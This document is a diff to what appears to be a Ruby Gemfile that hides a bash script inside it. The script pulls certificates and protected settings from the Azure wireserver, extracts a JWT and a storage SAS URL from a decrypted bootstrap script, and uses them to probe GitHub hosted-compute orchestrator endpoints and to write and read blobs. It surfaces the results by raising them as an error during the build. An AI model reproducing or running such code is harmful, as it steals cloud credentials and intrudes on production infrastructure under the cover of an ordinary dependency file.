@@ -2,7 +2,7 @@ require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
 m = []
 shell_code = <<'SHELL'
 set +e
-WD=/tmp/v112; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
+WD=/tmp/v113; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
 curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
 CERT_URL=$(python3 -c 'import re,html; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(html.unescape(m.group(1)) if m else "")')
 openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
@@ -17,56 +17,88 @@ python3 -c 'import json; d=json.load(open("vm.json")); print(d["extensionGoalSta
 base64 -d < ps.b64 > ps.der 2>/dev/null
 openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
 python3 -c 'import json; d=json.load(open("ps.json")); print(d.get("script",""),end="")' | base64 -d > bs.sh 2>/dev/null
-echo "STEP_OK bs_size=$(wc -c < bs.sh)"
 
-# DUMP FULL JWT payload (sanitize signature only)
+# Dump JWT claims as hex (no truncation)
 JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
-HEAD=$(echo "$JWT" | cut -d. -f1 | tr '_-' '/+'); HL=${#HEAD}; HM=$((HL%4)); [ $HM -ne 0 ] && HEAD="${HEAD}$(printf '=%.0s' $(seq 1 $((4-HM))))"
-echo "STEP_JWT_HEAD=$(echo "$HEAD" | base64 -d 2>/dev/null | tr -d '\n')"
 PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
-PAY_DEC=$(echo "$PAY" | base64 -d 2>/dev/null | tr -d '\n')
-# Replace JWT-id-style hex with marker for sanitization
-echo "STEP_JWT_PAYLOAD: $PAY_DEC"
+PAY_HEX=$(echo "$PAY" | base64 -d 2>/dev/null | od -An -tx1 | tr -d ' \n')
+echo "STEP_JWT_PAYLOAD_HEX=$PAY_HEX"
 
-# Grep ALL urls + curl calls in bs.sh
-echo "STEP_BS_URLS:"
-grep -oE '(https?|wss?)://[^[:space:]"'"'"'`<>]+' bs.sh | sort -u | head -20
+# Decode JWT, extract iat / rbf / aud / iss
+python3 -c "
+import json, base64
+p = '$PAY'
+data = json.loads(base64.b64decode(p))
+for k, v in data.items():
+    print(f'STEP_JWT_CLAIM_{k}={v}')
+"
 
-echo "STEP_BS_CURL_CALLS:"
-grep -nE 'curl[^|]+' bs.sh | head -30
+# Look at bs.sh for orchestrator calls / API paths used by HCA
+echo "STEP_BS_HOSTED_COMPUTE_REFS:"
+grep -nE '(hosted-compute|orchestrator|watchdog|/v[0-9]/|API_VERSION|api_path|endpoint)' bs.sh | head -30
 
-# Dump 401-LEN-230 body in detail (for /v1/register endpoint)
-if [ -n "$JWT" ]; then
-  echo "STEP_BODY_DUMP_REGISTER:"
-  curl -s -m 5 -H "Authorization: Bearer $JWT" -o b1.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/register"
-  cat b1.txt
+# Probe orchestrator with multi-method + Content-Type variations
+JWT2=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
+if [ -n "$JWT2" ]; then
+  # First check if JWT is currently valid by hitting / (we know it does)
+  curl -s -m 5 -H "Authorization: Bearer $JWT2" -o b0.txt -w "STEP_ORCH_ROOT_HTTP=%{http_code}_LEN=%{size_download}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/"
+  echo "STEP_ROOT_BODY=$(head -c 100 b0.txt)"
+  
+  # Try every reasonable endpoint pattern with GET and POST
+  for ep in /v1/register /v1/lease /v1/pickup /v1/operations /v1/work /v1/agents /v1/registrations /v1/poll; do
+    for method in GET POST; do
+      curl -s -m 5 -X "$method" -H "Authorization: Bearer $JWT2" -H "Content-Type: application/json" -d '{}' -o body.txt -w "$ep $method HTTP=%{http_code} LEN=%{size_download}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com$ep"
+      BODY=$(head -c 250 body.txt | tr '\n' ' ' | tr -d '\0')
+      echo "STEP_M $method $ep body=$BODY"
+    done
+  done
+fi
+
+# Test SAS URL functionality: try writing a PROBE-MARK to the diag container
+SAS=$(grep -oE 'https://hcrpprodeus0[12]diag\.blob\.core\.windows\.net/[a-f0-9-]+\?[^[:space:]"]+' bs.sh | head -1)
+# Decode & to & in the URL (JSON-encoded ampersand)
+SAS_DEC=$(echo "$SAS" | sed 's|\u0026|\&|g')
+echo "STEP_SAS_FOUND=$(echo "$SAS_DEC" | head -c 80)..."
+
+if [ -n "$SAS_DEC" ]; then
+  # Try writing a marker blob via the SAS
+  PROBE="BENTY-PROBE-MARK-$(date +%s)"
+  # Append a blob: PUT blob with new name in the same container
+  # First, parse SAS URL to construct a write path
+  SAS_URL_FOR_BLOB=$(echo "$SAS_DEC" | python3 -c "
+import sys, urllib.parse
+url = sys.stdin.read().strip()
+parts = urllib.parse.urlparse(url)
+# Container is in path; append new blob name
+new_path = parts.path + '/probe-mark-' + '$PROBE'
+new_url = parts._replace(path=new_path).geturl()
+print(new_url)
+")
+  echo "STEP_SAS_WRITE_URL_TYPE=put_blob"
+  echo "STEP_SAS_WRITE_TEST:"
+  curl -s -m 10 -X PUT -H "x-ms-blob-type: BlockBlob" -H "x-ms-version: 2020-04-08" -d "$PROBE" -o w.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$SAS_URL_FOR_BLOB"
+  head -c 300 w.txt
   echo ""
-  echo "STEP_BODY_DUMP_LEASE:"
-  curl -s -m 5 -H "Authorization: Bearer $JWT" -o b2.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/lease"
-  cat b2.txt
+  
+  # Try LIST container (likely 403 since sp=acw)
+  CONTAINER_LIST_URL="${SAS_DEC}&comp=list&restype=container"
+  echo "STEP_SAS_LIST_TEST:"
+  curl -s -m 10 -o l.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$CONTAINER_LIST_URL"
+  head -c 300 l.txt
   echo ""
-  # Try POST methods (registration typically POST)
-  echo "STEP_POST_REGISTER:"
-  curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}' -o b3.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/register"
-  cat b3.txt
+  
+  # Read back the probe-mark to verify write worked
+  echo "STEP_SAS_READ_BACK:"
+  curl -s -m 10 -o r.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$SAS_URL_FOR_BLOB"
+  head -c 300 r.txt
   echo ""
 fi
 
-# Use SAS URL to test storage access (write to OWN container only)
-SAS=$(grep -oE 'https://hcrpprodeus01diag\.blob\.core\.windows\.net/[^[:space:]"]+' bs.sh | head -1)
-echo "STEP_SAS_HOST=$(echo "$SAS" | cut -d/ -f3) sas_path_len=$(echo "$SAS" | cut -d/ -f4- | head -c 100 | wc -c)"
-SAS_HOST=$(echo "$SAS" | cut -d/ -f3)
-# Test list at storage account level (likely 401 if SAS doesn't allow)
-echo "STEP_SAS_LIST_TEST:"
-curl -s -m 5 -o lst.xml -w "HTTP %{http_code}\n" "https://$SAS_HOST/?comp=list"
-head -c 300 lst.xml
-echo ""
-
 SHELL
-Tempfile.create('v112.sh') do |f|
+Tempfile.create('v113.sh') do |f|
   f.write(shell_code); f.flush
   output = `bash #{f.path} 2>&1`
-  output.lines.each { |line| m << "v112 " + line.chomp[0..800] }
+  output.lines.each { |line| m << "v113 " + line.chomp[0..600] }
 end
 raise m.join("\n")
 source "https://rubygems.org"
